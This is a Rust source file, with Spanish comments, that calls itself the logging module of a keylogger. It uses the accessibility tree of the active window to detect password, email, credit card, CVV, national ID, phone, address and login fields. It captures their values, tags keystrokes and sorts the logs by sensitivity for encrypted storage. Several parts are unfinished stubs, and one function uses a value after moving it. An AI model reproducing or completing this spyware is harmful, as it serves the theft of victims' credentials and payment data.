/*
    WORK IN PROGRESS


Este archivo de log.rs es para manejar la funcionalidad de registro del keylogger.rs, incluyendo la captura de eventos de teclado, la identificación de la ventana activa y el almacenamiento seguro

WIP: Todavía no lo testee, solo lo pusheo para guardarlo
Utiliza AccessKit para detectar campos sensibles en la ventana activa y clasificar los logs según su sensibilidad.

*/

use chrono::Utc;
use accesskit::{NodeBuilder, NodeId, Role, Tree, TreeUpdate}; 
use accesskit_windows::Adapter;
use std::collections::HashMap;


// Estructura de datos para campos sensibles detectados
pub struct SensitiveFieldDetector {
    sensitive_fields: HashMap<String, FieldType>, // utilizamos una tabla hash para evitar duplicados
}


// Tipos de campos sensibles
#[derive(Debug, Clone)]
pub enum FieldType {
    Password,
    Email, // email = username en muchos casos
    CreditCard,
    CVV,
    DNI,
    Phone,
    Address,
    Login,
}

// Implementación del detector de campos sensibles
impl SensitiveFieldDetector {
    pub fn new() -> Self {
        Self {
            sensitive_fields: HashMap::new(), // hashmap constructor
        }
    }
    

    // Escanear la ventana activa y detectar campos sensibles
    pub fn scan_active_window(&mut self) -> Result<Vec<SensitiveField>, Box<dyn std::error::Error>> {
        let mut sensitive_fields = Vec::new();
        
        // Obtener el árbol de accesibilidad de la ventana activa
        if let Some(tree) = self.get_accessibility_tree()? {
            self.traverse_tree(&tree, &mut sensitive_fields)?;
        }
        
        Ok(sensitive_fields)
    }
    
    fn get_accessibility_tree(&self) -> Result<Option<Tree>, Box<dyn std::error::Error>> {
        // Implementar obtención del árbol de accesibilidad
        // Esto requiere integración específica con AccessKit
        todo!("Implementar obtención del árbol de accesibilidad")
    }
    
    fn traverse_tree(&self, tree: &Tree, sensitive_fields: &mut Vec<SensitiveField>) -> Result<(), Box<dyn std::error::Error>> {
        // Recorrer todos los nodos del árbol
        for (node_id, node) in tree.nodes() {
            if let Some(field_type) = self.classify_node(node) {
                sensitive_fields.push(SensitiveField {
                    id: format!("{:?}", node_id),
                    field_type,
                    label: node.name().unwrap_or("").to_string(),
                    value: node.value().unwrap_or("").to_string(),
                    is_focused: node.is_focused(),
                });
            }
        }
        Ok(())
    }
    
    fn classify_node(&self, node: &accesskit::Node) -> Option<FieldType> {
        match node.role() {
            Role::PasswordBox => Some(FieldType::Password),
            Role::TextBox => {
                // Analizar el nombre/label del campo
                if let Some(name) = node.name() {
                    let name_lower = name.to_lowercase();
                    if name_lower.contains("password") || name_lower.contains("pwd") {
                        Some(FieldType::Password)
                    } else if name_lower.contains("email") || name_lower.contains("e-mail") {
                        Some(FieldType::Email)
                    } else if name_lower.contains("credit") || name_lower.contains("card") {
                        Some(FieldType::CreditCard)
                    } else if name_lower.contains("cvv") || name_lower.contains("cvc") {
                        Some(FieldType::CVV)
                    } else if name_lower.contains("DNI") || name_lower.contains("dni") {
                        Some(FieldType::DNI)
                    } else if name_lower.contains("phone") || name_lower.contains("tel") {
                        Some(FieldType::Phone)
                    } else if name_lower.contains("address") || name_lower.contains("street") {
                        Some(FieldType::Address)
                    } else if name_lower.contains("login") || name_lower.contains("username") {
                        Some(FieldType::Login)
                    } else {
                        None
                    }
                } else {
                    None
                }
            },
            _ => None,
        }
    }
}

#[derive(Debug, Clone)]
pub struct SensitiveField {
    pub id: String,
    pub field_type: FieldType,
    pub label: String,
    pub value: String,
    pub is_focused: bool,
}

pub struct LogEntry {
    pub timestamp: chrono::DateTime<Utc>,
    pub event_type: EventType,
    pub process_name: String,
    pub window_title: String,
    pub content: String,
    pub sensitive_context: Option<Vec<SensitiveField>>,
}

#[derive(Debug)]
pub enum EventType {
    Keystroke,
    MouseClick,
    SensitiveFieldDetected,
}

impl LogEntry {
    pub fn new_keystroke(key: &str, process: &str, window: &str) -> Self {
        Self {
            timestamp: Utc::now(),
            event_type: EventType::Keystroke,
            process_name: process.to_string(),
            window_title: window.to_string(),
            content: key.to_string(),
            sensitive_context: None,
        }
    }
    
    pub fn with_sensitive_context(mut self, fields: Vec<SensitiveField>) -> Self {
        self.sensitive_context = Some(fields);
        if !fields.is_empty() {
            self.event_type = EventType::SensitiveFieldDetected;
        }
        self
    }
}

pub fn write_log(entry: LogEntry) {
    // Clasificar por sensibilidad
    let sensitivity_level = classify_sensitivity(&entry);
    
    match sensitivity_level {
        SensitivityLevel::High => {
            // Logs altamente sensibles - máxima encriptación
            write_encrypted_log(&entry, EncryptionLevel::Maximum);
        },
        SensitivityLevel::Medium => {
            // Logs medianamente sensibles
            write_encrypted_log(&entry, EncryptionLevel::Standard);
        },
        SensitivityLevel::Low => {
            // Logs normales
            write_standard_log(&entry);
        },
    }
    
    // Debug output
    println!("[{}] [{}] {}: {}", 
        entry.timestamp.format("%Y-%m-%d %H:%M:%S"),
        format!("{:?}", entry.event_type),
        entry.process_name,
        entry.content
    );
    
    if let Some(ref sensitive_fields) = entry.sensitive_context {
        for field in sensitive_fields {
            println!("  ⚠️  SENSITIVE: {:?} field '{}' detected", field.field_type, field.label);
        }
    }
}

#[derive(Debug)]
enum SensitivityLevel {
    High,    // Passwords, credit cards, DNI
    Medium,  // Email, phone, address
    Low,     // Normal text
}

#[derive(Debug)]
enum EncryptionLevel {
    Maximum,  // AES-256-GCM + key derivation
    Standard, // AES-128-GCM
}

fn classify_sensitivity(entry: &LogEntry) -> SensitivityLevel {
    if let Some(ref fields) = entry.sensitive_context {
        for field in fields {
            match field.field_type {
                FieldType::Password | FieldType::CreditCard | FieldType::CVV | FieldType::DNI => {
                    return SensitivityLevel::High;
                },
                FieldType::Email | FieldType::Phone | FieldType::Address => {
                    return SensitivityLevel::Medium;
                },
                _ => {}
            }
        }
    }
    SensitivityLevel::Low
}

fn write_encrypted_log(entry: &LogEntry, level: EncryptionLevel) {
    // TODO: Implementar encriptación según el nivel
    println!("📝 ENCRYPTED LOG ({:?}): Sensitive data detected", level);
}

fn write_standard_log(entry: &LogEntry) {
    // TODO: Implementar log estándar
    println!("📝 STANDARD LOG: Regular keylog entry");
}
